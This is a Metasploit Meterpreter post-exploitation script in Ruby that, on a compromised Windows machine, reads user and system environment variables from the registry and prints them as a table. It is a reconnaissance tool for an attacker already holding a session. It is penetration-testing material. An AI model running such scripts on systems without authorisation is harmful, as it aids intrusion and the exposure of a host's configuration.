# $Id: get_env.rb 15108 2012-04-16 05:01:41Z rapid7 $
# $Revision: $
#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)
var_names = []
var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")

def list_env_vars(var_names)
	print_status("Getting all System and User Variables")
	tbl = Rex::Ui::Text::Table.new(
			'Header'  => "Enviroment Variable list",
			'Indent'  => 1,
			'Columns' =>
				[
					"Name",
					"Value"
				])
	var_names.flatten.each do |v|
		tbl << [v,@client.fs.file.expand_path("\%#{v}\%")]
	end
	print("\n" + tbl.to_s + "\n")
end


opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for extracting a list of all System and User environment variables."
		print_line(opts.usage)
		raise Rex::Script::Completed

	end
}
if client.platform =~ /win32|win64/
	list_env_vars(var_names)
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
